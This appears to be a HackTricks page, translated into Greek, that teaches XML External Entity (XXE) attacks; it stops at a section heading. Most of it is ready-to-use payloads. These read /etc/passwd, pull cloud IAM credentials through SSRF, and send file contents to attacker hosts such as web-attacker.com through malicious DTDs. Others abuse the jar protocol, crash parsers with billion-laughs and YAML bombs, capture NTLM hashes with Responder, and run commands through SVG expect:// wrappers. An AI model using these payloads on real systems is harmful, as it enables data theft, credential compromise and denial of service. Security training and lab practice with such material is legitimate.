# XXE - XEE - Εξωτερική Οντότητα XML

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρός Συνεργάτης AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικά του XML

Το XML είναι μια γλώσσα σήμανσης σχεδιασμένη για την αποθήκευση και μεταφορά δεδομένων, παρουσιάζοντας μια ευέλικτη δομή που επιτρέπει τη χρήση ετικετών με περιγραφικά ονόματα. Διαφέρει από το HTML μην είναι περιορισμένο σε ένα σύνολο προκαθορισμένων ετικετών. Η σημασία του XML έχει μειωθεί με την άνοδο του JSON, παρά τον αρχικό του ρόλο στην τεχνολογία AJAX.

* **Αναπαράσταση Δεδομένων μέσω Οντοτήτων**: Οι οντότητες στο XML επιτρέπουν την αναπαράσταση δεδομένων, συμπεριλαμβανομένων ειδικών χαρακτήρων όπως `&lt;` και `&gt;`, που αντιστοιχούν σε `<` και `>` για να αποφευχθεί η σύγκρουση με το σύστημα ετικετών του XML.
* **Ορισμός Στοιχείων XML**: Το XML επιτρέπει τον ορισμό τύπων στοιχείων, περιγράφοντας πώς πρέπει να δομηθούν τα στοιχεία και ποιο περιεχόμενο μπορούν να περιέχουν, κυμαίνοντας από οποιοδήποτε είδος περιεχομένου έως συγκεκριμένα παιδικά στοιχεία.
* **Ορισμός Τύπου Εγγράφου (DTD)**: Τα DTD είναι κρίσιμα στο XML για τον ορισμό της δομής του εγγράφου και των τύπων δεδομένων που μπορεί να περιέχει. Μπορεί να είναι εσωτερικά, εξωτερικά ή συνδυασμένα, καθοδηγώντας τον τρόπο μορφοποίησης και επικύρωσης των εγγράφων.
* **Προσαρμοσμένες και Εξωτερικές Οντότητες**: Το XML υποστηρίζει τη δημιουργία προσαρμοσμένων οντοτήτων μέσα σε ένα DTD για ευέλικτη αναπαράσταση δεδομένων. Οι εξωτερικές οντότητες, οριζόμενες με ένα URL, προκαλούν ανησυχίες ασφαλείας, ιδιαίτερα στο πλαίσιο των επιθέσεων Εξωτερικών Οντοτήτων XML (XXE), οι οποίες εκμεταλλεύονται τον τρόπο με τον οποίο οι αναλυτές XML χειρίζονται εξωτερικές πηγές δεδομένων: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
* **Ανίχνευση XXE με Οντότητες Παραμέτρων**: Για την ανίχνευση ευπαθειών XXE, ειδικά όταν οι συμβατικές μέθοδοι αποτυγχάνουν λόγω μέτρων ασφαλείας του αναλυτή, μπορούν να χρησιμοποιηθούν οντότητες παραμέτρων XML. Αυτές οι οντότητες επιτρέπουν τεχνικές ανίχνευσης εκτός ζώνης, όπως η ενεργοποίηση αναζητήσεων DNS ή αιτήσεων HTTP σε έναν ελεγχόμενο τομέα, για την επιβεβαίωση της ευπάθειας.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Κύριες επιθέσεις

[**Οι περισσότερες από αυτές τις επιθέσεις δοκιμάστηκαν χρησιμοποιώντας τα εκπληκτικά εργαστήρια XEE της Portswiggers: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Νέο τεστ Οντότητας

Σε αυτήν την επίθεση θα δοκιμάσω αν μια απλή νέα δήλωση ΟΝΤΟΤΗΤΑΣ λειτουργεί
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### Διάβασμα αρχείου

Ας προσπαθήσουμε να διαβάσουμε το `/etc/passwd` με διαφορετικούς τρόπους. Για τα Windows μπορείτε να δοκιμάσετε να διαβάσετε: `C:\windows\system32\drivers\etc\hosts`

Σε αυτήν την πρώτη περίπτωση παρατηρήστε ότι το SYSTEM "_\*\*file:///\*\*etc/passwd_" θα λειτουργήσει επίσης.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
Αυτή η δεύτερη περίπτωση θα πρέπει να είναι χρήσιμη για την εξαγωγή ενός αρχείου εάν ο web server χρησιμοποιεί PHP (Δεν είναι η περίπτωση των εργαστηρίων της Portswiggers)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Σε αυτήν την τρίτη περίπτωση παρατηρούμε ότι δηλώνουμε το `Element stockCheck` ως ANY
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Κατάλογος καταχώρισης

Σε εφαρμογές βασισμένες σε **Java**, είναι πιθανό να είναι δυνατή η **καταχώριση των περιεχομένων ενός καταλόγου** μέσω XXE με ένα φορτίο όπως (απλά ζητώντας τον κατάλογο αντί για το αρχείο):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Ένα XXE μπορεί να χρησιμοποιηθεί για να καταχραστεί ένα SSRF μέσα σε ένα cloud
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Τυφλή SSRF

Χρησιμοποιώντας τη **προηγούμενα σχολιασμένη τεχνική** μπορείτε να κάνετε τον διακομιστή να έχει πρόσβαση σε έναν διακομιστή που ελέγχετε για να εμφανίσει την ευπάθειά του. Αλλά, αν αυτό δεν λειτουργεί, ίσως είναι επειδή **δεν επιτρέπονται τα XML entities**, σε αυτήν την περίπτωση θα μπορούσατε να δοκιμάσετε να χρησιμοποιήσετε **XML παραμετρικά entities**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Τυφλή" SSRF - Εξόρυξη δεδομένων εκτός ζώνης

**Σε αυτήν την περίπτωση θα κάνουμε τον εξυπηρετητή να φορτώσει ένα νέο DTD με ένα κακόβουλο φορτίο που θα στείλει το περιεχόμενο ενός αρχείου μέσω αιτήματος HTTP (**για πολλαπλές γραμμές αρχείων μπορείτε να δοκιμάσετε να το εξορύξετε μέσω** _**ftp://**_ **χρησιμοποιώντας αυτόν τον βασικό εξυπηρετητή για παράδειγμα [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Αυτή η εξήγηση βασίζεται στο** [**εργαστήριο της Portswigger εδώ**](https://portswigger.net/web-security/xxe/blind)**.**

Στο κακόβουλο DTD που δίνεται, πραγματοποιούνται μια σειρά βημάτων για την εξόρυξη δεδομένων:

### Παράδειγμα Κακόβουλου DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Τα βήματα που εκτελούνται από αυτό το DTD περιλαμβάνουν:

1. **Ορισμός Οντοτήτων Παραμέτρων:**
* Δημιουργείται μια οντότητα παραμέτρου XML, `%file`, που διαβάζει το περιεχόμενο του αρχείου `/etc/hostname`.
* Δημιουργείται μια άλλη οντότητα παραμέτρου XML, `%eval`. Δηλώνει δυναμικά μια νέα οντότητα παραμέτρου XML, `%exfiltrate`. Η οντότητα `%exfiltrate` ορίζεται να κάνει μια αίτηση HTTP προς τον διακομιστή του επιτιθέμενου, περνώντας το περιεχόμενο της οντότητας `%file` στη συμβολοσειρά ερωτήματος του URL.
2. **Εκτέλεση των Οντοτήτων:**
* Η οντότητα `%eval` χρησιμοποιείται, οδηγώντας στην εκτέλεση της δυναμικής δήλωσης της οντότητας `%exfiltrate`.
* Η οντότητα `%exfiltrate` χρησιμοποιείται στη συνέχεια, ενεργοποιώντας μια αίτηση HTTP προς το συγκεκριμένο URL με το περιεχόμενο του αρχείου.

Ο επιτιθέμενος φιλοξενεί αυτό το κακόβουλο DTD σε έναν διακομιστή υπό τον έλεγχό του, συνήθως σε ένα URL όπως `http://web-attacker.com/malicious.dtd`.

**Φορτίο XXE:** Για να εκμεταλλευτεί μια ευπαθή εφαρμογή, ο επιτιθέμενος στέλνει ένα φορτίο XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### Βασισμένο σε Σφάλματα (Εξωτερικό DTD)

**Σε αυτήν την περίπτωση θα κάνουμε τον διακομιστή να φορτώσει ένα κακόβουλο DTD που θα εμφανίσει το περιεχόμενο ενός αρχείου μέσα σε ένα μήνυμα σφάλματος (αυτό ισχύει μόνο αν μπορείτε να δείτε μηνύματα σφάλματος).** [**Παράδειγμα από εδώ.**](https://portswigger.net/web-security/xxe/blind)

Ένα μήνυμα σφάλματος ανάλυσης XML, αποκαλύπτοντας το περιεχόμενο του αρχείου `/etc/passwd`, μπορεί να προκληθεί χρησιμοποιώντας ένα κακόβουλο εξωτερικό Ορισμό Τύπου Εγγράφου (DTD). Αυτό επιτυγχάνεται μέσω των ακόλουθων βημάτων:

1. Ορίζεται ένα XML παραμετρικό στοιχείο με το όνομα `file`, το οποίο περιέχει το περιεχόμενο του αρχείου `/etc/passwd`.
2. Ορίζεται ένα XML παραμετρικό στοιχείο με το όνομα `eval`, το οποίο ενσωματώνει μια δυναμική δήλωση για ένα άλλο XML παραμετρικό στοιχείο με το όνομα `error`. Αυτό το στοιχείο `error`, όταν αξιολογηθεί, προσπαθεί να φορτώσει ένα μη υπαρκτό αρχείο, ενσωματώνοντας το περιεχόμενο του στοιχείου `file` ως όνομά του.
3. Καλείται το στοιχείο `eval`, οδηγώντας στη δυναμική δήλωση του στοιχείου `error`.
4. Η κλήση του στοιχείου `error` οδηγεί σε μια προσπάθεια φόρτωσης ενός μη υπαρκτού αρχείου, παράγοντας ένα μήνυμα σφάλματος που περιλαμβάνει το περιεχόμενο του αρχείου `/etc/passwd` ως μέρος του ονόματος του αρχείου.

Το κακόβουλο εξωτερικό DTD μπορεί να κληθεί με το ακόλουθο XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### **Βασισμένο σε Σφάλματα (σύστημα DTD)**

Τι γίνεται όταν υπάρχουν τυφλές ευπάθειες XXE όταν **αποκλείονται οι εκτός-ορίων αλληλεπιδράσεις** (δεν είναι διαθέσιμες εξωτερικές συνδέσεις);

Μια κενότητα στην προδιαγραφή της γλώσσας XML μπορεί να **αποκαλύψει ευαίσθητα δεδομένα μέσω μηνυμάτων σφαλμάτων όταν η DTD ενός εγγράφου ανακατεύει εσωτερικές και εξωτερικές δηλώσεις**. Αυτό το θέμα επιτρέπει την εσωτερική επανορισμό των οντοτήτων που έχουν δηλωθεί εξωτερικά, διευκολύνοντας την εκτέλεση επιθέσεων XXE βασισμένων σε σφάλματα. Τέτοιες επιθέσεις εκμεταλλεύονται την επανορισμό μιας οντότητας παραμέτρου XML, που αρχικά έχει δηλωθεί σε μια εξωτερική DTD, από μέσα σε μια εσωτερική DTD. Όταν οι εκτός-ορίων συνδέσεις αποκλείονται από τον διακομιστή, οι επιτιθέμενοι πρέπει να βασιστούν σε τοπικά αρχεία DTD για να πραγματοποιήσουν την επίθεση, με στόχο την πρόκληση ενός σφάλματος ανάλυσης για την αποκάλυψη ευαίσθητων πληροφοριών.

Ας υποθέσουμε ένα σενάριο όπου το σύστημα αρχείων του διακομιστή περιέχει ένα αρχείο DTD στο `/usr/local/app/schema.dtd`, που ορίζει μια οντότητα με το όνομα `custom_entity`. Ένας επιτιθέμενος μπορεί να προκαλέσει ένα σφάλμα ανάλυσης XML αποκαλύπτοντας τα περιεχόμενα του αρχείου `/etc/passwd`, υποβάλλοντας ένα υβριδικό DTD ως εξής:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Τα παρακάτω βήματα εκτελούνται από αυτό το DTD:

* Ο ορισμός ενός XML παραμετρικού ονόματος οντότητας με το όνομα `local_dtd` περιλαμβάνει το εξωτερικό αρχείο DTD που βρίσκεται στο σύστημα αρχείων του διακομιστή.
* Μια επανορισμός συμβαίνει για την XML παραμετρική οντότητα `custom_entity`, η οποία αρχικά ορίζεται στο εξωτερικό DTD, για να ενθυλακώσει ένα [εκμεταλλευόμενο XXE exploit βασισμένο σε σφάλματα](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Αυτή η επανορισμός σχεδιάζεται να προκαλέσει ένα σφάλμα ανάλυσης, αποκαλύπτοντας το περιεχόμενο του αρχείου `/etc/passwd`.
* Χρησιμοποιώντας την οντότητα `local_dtd`, το εξωτερικό DTD εμπλέκεται, περικλείοντας τη νεοορισμένη `custom_entity`. Αυτή η ακολουθία ενεργειών προκαλεί την εκπομπή του μηνύματος σφάλματος που στοχεύει το exploit.

**Πραγματικό παράδειγμα:** Συστήματα που χρησιμοποιούν το περιβάλλον εργασίας GNOME συχνά έχουν ένα DTD στο `/usr/share/yelp/dtd/docbookx.dtd` που περιέχει μια οντότητα που ονομάζεται `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Καθώς αυτή η τεχνική χρησιμοποιεί ένα **εσωτερικό DTD πρέπει πρώτα να βρείτε ένα έγκυρο**. Μπορείτε να το κάνετε **εγκαθιστώντας** το ίδιο **ΛΣ / Λογισμικό** που χρησιμοποιεί ο διακομιστής και **ψάχνοντας μερικά προεπιλεγμένα DTDs**, ή **ανακτώντας μια λίστα** με **προεπιλεγμένα DTDs** μέσα στα συστήματα και **ελέγχοντας** αν υπάρχει κάποιο από αυτά:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Για περισσότερες πληροφορίες ελέγξτε [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Εύρεση DTDs μέσα στο σύστημα

Στο εντυπωσιακό αποθετήριο του github που ακολουθεί μπορείτε να βρείτε **διαδρομές DTDs που μπορεί να υπάρχουν στο σύστημα**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Επιπλέον, αν έχετε την **εικόνα Docker του συστήματος θύματος**, μπορείτε να χρησιμοποιήσετε το εργαλείο από το ίδιο αποθετήριο για να **σαρώσετε** την **εικόνα** και να **βρείτε** τη διαδρομή των **DTDs** που υπάρχουν μέσα στο σύστημα. Διαβάστε το [Readme του github](https://github.com/GoSecure/dtd-finder) για να μάθετε πώς.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE μέσω Αναλυτών Αρχείων Office Open XML

Για μια πιο λεπτομερή εξήγηση αυτής της επίθεσης, **ελέγξτε τη δεύτερη ενότητα του** [**αυτού του εκπληκτικού άρθρου**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **από τη Detectify**.

Η δυνατότητα **ανέβασμας εγγράφων Microsoft Office προσφέρεται από πολλές web εφαρμογές**, οι οποίες στη συνέχεια προχωρούν στην εξαγωγή συγκεκριμένων λεπτομερειών από αυτά τα έγγραφα. Για παράδειγμα, μια web εφαρμογή μπορεί να επιτρέπει στους χρήστες να εισάγουν δεδομένα ανεβάζοντας ένα φύλλο εργασίας σε μορφή XLSX. Προκειμένου ο αναλυτής να εξάγει τα δεδομένα από το φύλλο εργασίας, αναγκαστικά θα χρειαστεί να αναλύσει τουλάχιστον ένα αρχείο XML.

Για να δοκιμάσετε αυτήν την ευπάθεια, είναι απαραίτητο να δημιουργήσετε ένα **αρχείο Microsoft Office που περιέχει ένα φορτίο XXE**. Το πρώτο βήμα είναι να δημιουργήσετε έναν κενό κατάλογο στον οποίο το έγγραφο μπορεί να αποσυμπιεστεί.

Αφού αποσυμπιεστεί το έγγραφο, το αρχείο XML που βρίσκεται στη διαδρομή `./unzipped/word/document.xml` πρέπει να ανοιχτεί και να επεξεργαστεί σε έναν προτιμώμενο επεξεργαστή κειμένου (όπως το vim). Το XML πρέπει να τροποποιηθεί ώστε να περιλαμβάνει το επιθυμητό φορτίο XXE, συχνά ξεκινώντας με ένα αίτημα HTTP.

Οι τροποποιημένες γραμμές XML πρέπει να εισαχθούν μεταξύ των δύο ριζικών XML αντικειμένων. Είναι σημαντικό να αντικατασταθεί ο URL με έναν URL που μπορεί να παρακολουθηθεί για αιτήσεις.

Τέλος, το αρχείο μπορεί να συμπιεστεί για να δημιουργηθεί το κακόβουλο αρχείο poc.docx. Από τον προηγουμένως δημιουργημένο κατάλογο "unzipped", πρέπει να εκτελεστεί η ακόλουθη εντολή:

Τώρα, το δημιουργημένο αρχείο μπορεί να ανέβει στην πιθανώς ευάλωτη web εφαρμογή, και κάποιος μπορεί να ελπίζει για ένα αίτημα να εμφανιστεί στα αρχεία καταγραφής του Burp Collaborator.

### Πρωτόκολλο Jar

Το πρωτόκολλο **jar** είναι προσβάσιμο αποκλειστικά μέσα σε **εφαρμογές Java**. Σχεδιάστηκε για να επιτρέπει την πρόσβαση σε αρχεία εντός ενός αρχείου **PKZIP** (π.χ., `.zip`, `.jar`, κλπ.), εξυπηρετώντας τόσο τοπικά όσο και απομακρυσμένα αρχεία.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Για να μπορέσετε να έχετε πρόσβαση σε αρχεία μέσα σε αρχεία PKZIP είναι **πολύ χρήσιμο για την κατάχρηση του XXE μέσω αρχείων συστήματος DTD.** Ελέγξτε [αυτή την ενότητα για να μάθετε πώς να καταχραστείτε αρχεία συστήματος DTD](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Η διαδικασία πίσω από την πρόσβαση σε ένα αρχείο μέσα σε ένα αρχείο PKZIP μέσω του πρωτοκόλλου jar περιλαμβάνει αρκετά βήματα:

1. Γίνεται μια αίτηση HTTP για τον λήψη του αρχείου zip από μια συγκεκριμένη τοποθεσία, όπως `https://download.website.com/archive.zip`.
2. Η απάντηση HTTP που περιέχει το αρχείο αποθηκεύεται προσωρινά στο σύστημα, συνήθως σε τοποθεσία όπως `/tmp/...`.
3. Το αρχείο εξάγεται για να έχει πρόσβαση στο περιεχόμενό του.
4. Διαβάζεται το συγκεκριμένο αρχείο μέσα στο αρχείο, `file.zip`.
5. Μετά τη λειτουργία, τυχόν προσωρινά δημιουργημένα αρχεία κατά τη διάρκεια αυτής της διαδικασίας διαγράφονται.

Μια ενδιαφέρουσα τεχνική για να διακόψετε αυτή τη διαδικασία στο δεύτερο βήμα περιλαμβάνει τη διατήρηση της σύνδεσης του διακομιστή ανοιχτή για αόριστο χρονικό διάστημα κατά την παροχή του αρχείου αρχείου. Εργαλεία που είναι διαθέσιμα στο [αυτό το αποθετήριο](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) μπορούν να χρησιμοποιηθούν για αυτόν τον σκοπό, συμπεριλαμβανομένου ενός διακομιστή Python (`slow_http_server.py`) και ενός διακομιστή Java (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Η εγγραφή αρχείων σε έναν προσωρινό κατάλογο μπορεί να βοηθήσει στην **επιδείνωση μιας άλλης ευπάθειας που σχετίζεται με μια διάβαση διαδρομής** (όπως η τοπική συμπερίληψη αρχείου, ενσωμάτωση προτύπου, XSLT RCE, απεικονισμός κ.λπ.).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Επίθεση Billion Laugh
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Επίθεση Yaml
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Επίθεση Quadratic Blowup

![](<../.gitbook/assets/image (531).png>)

#### Απόκτηση NTML

Σε υπολογιστές με λειτουργικό σύστημα Windows είναι δυνατή η απόκτηση του hash NTML του χρήστη του web server με την ρύθμιση ενός handler με το responder.py:
```bash
Responder.py -I eth0 -v
```
και με την αποστολή του παρακάτω αιτήματος
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Κρυφές Επιφάνειες XXE

### XInclude

Κατά την ενσωμάτωση δεδομένων πελάτη σε εγγράφους XML στην πλευρά του διακομιστή, όπως αυτούς σε αιτήσεις SOAP στο backend, ο άμεσος έλεγχος επί της δομής XML συχνά περιορίζεται, δυσχεραίνοντας τις παραδοσιακές επιθέσεις XXE λόγω περιορισμών στην τροποποίηση του στοιχείου `DOCTYPE`. Ωστόσο, μια επίθεση `XInclude` παρέχει μια λύση επιτρέποντας την εισαγωγή εξωτερικών οντοτήτων εντός οποιουδήποτε στοιχείου δεδομένων του εγγράφου XML. Αυτή η μέθοδος είναι αποτελεσματική ακόμα και όταν μόνο ένα τμήμα των δεδομένων εντός ενός εγγράφου XML που δημιουργήθηκε από τον διακομιστή μπορεί να ελεγχθεί.

Για την εκτέλεση μιας επίθεσης `XInclude`, πρέπει να δηλωθεί το namespace του `XInclude` και να καθοριστεί η διαδρομή του αρχείου για την επιθυμητή εξωτερική οντότητα. Παρακάτω παρουσιάζεται ένα συνοπτικό παράδειγμα πώς μια τέτοια επίθεση μπορεί να διαμορφωθεί:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Ελέγξτε το [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) για περισσότερες πληροφορίες!

### SVG - Μεταφόρτωση Αρχείων

Τα αρχεία που μεταφορτώνονται από τους χρήστες σε ορισμένες εφαρμογές, τα οποία στη συνέχεια επεξεργάζονται στον διακομιστή, μπορούν να εκμεταλλευτούν ευπάθειες στον τρόπο με τον οποίο χειρίζονται τα αρχεία XML ή αρχεία που περιέχουν XML. Δημοφιλής μορφές αρχείων όπως εγγράφα (DOCX) και εικόνες (SVG) βασίζονται στο XML.

Όταν οι χρήστες **μεταφορτώνουν εικόνες**, αυτές οι εικόνες επεξεργάζονται ή επικυρώνονται στον διακομιστή. Ακόμη και για εφαρμογές που αναμένουν μορφές όπως PNG ή JPEG, η **βιβλιοθήκη επεξεργασίας εικόνων του διακομιστή ενδέχεται να υποστηρίζει επίσης εικόνες SVG**. Το SVG, καθώς είναι μια μορφή βασισμένη σε XML, μπορεί να εκμεταλλευτεί από επιτιθέμενους για να υποβάλουν κακόβουλες εικόνες SVG, εκθέτοντας έτσι τον διακομιστή σε ευπάθειες XXE (XML External Entity).

Ένα παράδειγμα τέτοιας εκμετάλλευσης παρουσιάζεται παρακάτω, όπου μια κακόβουλη εικόνα SVG προσπαθεί να διαβάσει αρχεία συστήματος:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Μια άλλη μέθοδος περιλαμβάνει την προσπάθεια να **εκτελέσετε εντολές** μέσω του PHP "expect" wrapper:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
Και στις δύο περιπτώσεις, η μορφή SVG χρησιμοποιείται για να εκτελέσει επιθέσεις που εκμεταλλεύονται τις δυνατότητες επεξεργασίας XML του λογισμικού του διακομιστή, υπογραμμίζοντας την ανάγκη για αξιόπιστο έλεγχο εισόδου και μέτρα ασφαλείας.

Ελέγξτε το [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) για περισσότερες πληροφορίες!

**Σημείωση: Η πρώτη γραμμή του αρχείου που διαβάζετε ή το αποτέλεσμα της εκτέλεσης θα εμφανιστεί ΜΕΣΑ στη δημιουργημένη εικόνα. Έτσι, πρέπει να μπορείτε να έχετε πρόσβαση στην εικόνα που δημιούργησε το SVG.**

### **PDF - Μεταφόρτωση αρχείου**

Διαβάστε την παρακάτω ανάρτηση για **να μάθετε πώς να εκμεταλλευτείτε ένα XXE μεταφορτώνοντας ένα αρχείο PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Από x-www-urlencoded σε XML

Αν ένα αίτημα POST δέχεται τα δεδομένα σε μορφή XML, μπορείτε να δοκιμάσετε να εκμεταλλευτείτε ένα XXE σε αυτό το αίτημα. Για παράδειγμα, αν ένα κανονικό αίτημα περιέχει τα ακόλουθα:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Τότε μπορείτε να υποβάλετε το ακόλουθο αίτημα, με τον ίδιο ακριβώς τρόπο:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Από JSON σε XEE

